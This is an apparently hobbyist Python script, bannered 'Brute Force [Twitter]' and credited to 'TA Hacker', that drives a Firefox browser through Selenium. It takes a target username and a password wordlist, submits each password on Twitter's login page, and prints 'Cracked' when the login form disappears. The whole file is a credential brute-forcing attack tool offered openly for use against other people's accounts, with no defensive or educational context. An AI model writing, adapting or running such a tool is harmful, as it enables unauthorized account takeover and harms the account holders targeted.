from selenium import webdriver
print('''
	==================================
	|    Crack account [Free Version]|
	|     Brute Force [Twitter]      |
	|--------------------------------|
	| CoDeD By TA Hacker (@391F)     |
	|--------------------------------|

	''')


user = raw_input("Target Name => ")
passfile = raw_input("List Of Passwords => ")
loop_passfile = open(passfile, 'r').read().splitlines()

driver = webdriver.Firefox()
driver.get('https://twitter.com/login')

usr_box = driver.find_element_by_class_name('js-username-field')
usr_box.send_keys(user)


for passfile in loop_passfile:
    try:
        pwd_box = driver.find_element_by_class_name ('js-password-field')
        pwd_box.send_keys(passfile)
        login_button = driver.find_element_by_css_selector ('button.submit.EdgeButton.EdgeButton--primary.EdgeButtom--medium' )
        login_button.submit()
        t = 'js-password-field'
        html = driver.page_source
        if t in html:
            print ( "(" + user + ":" + passfile + ") is Incorrect\n" )
        else:
            print ( "\tCracked ===> (" + user + ":" + passfile + ") !...\n" )

    except:
       pass
